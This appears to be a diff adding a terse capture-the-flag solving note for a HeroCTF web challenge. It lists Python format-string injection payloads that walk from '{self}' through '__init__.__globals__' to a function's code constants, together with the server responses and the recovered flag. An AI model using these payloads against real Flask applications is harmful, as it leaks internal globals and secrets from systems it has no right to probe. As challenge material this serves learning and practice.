@@ -1,0 +1,24 @@
+http://chall2.heroctf.fr:7000/try
+	Content: {}
+
+	Cause Error
+		Something went wrong, sorry! It's only the alpha version !
+
+Response Header
+	Server: Werkzeug/1.0.1 Python/3.6.9
+
+{self}
+	<__main__.App object at 0x7fc26e477ba8>
+
+https://podalirius.net/articles/python-format-string-vulnerabilities/
+
+{self.__init__.__globals__}
+	{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fc2724db518>, '__spec__': None, '__annotations__': {}, '__builtins__': , '__file__': 'app.py', '__cached__': None, 'Flask': , 'render_template': , 'request': , 'FlaskView': , 'route': , 'dis': , 'app': , 'port': 8050, 'secret_function': , 'App': }
+
+{self.__init__.__globals__.secret_function}
+	Something went wrong, sorry! It's only the alpha version !
+{self.__init__.__globals__[secret_function]}
+	function secret_function at 0x7fc2725abe18
+
+{self.__init__.__globals__[secret_function].__code__.co_consts}
+	(None, 'Hero{l34k_my_byt3c0d3zzzzzz}')
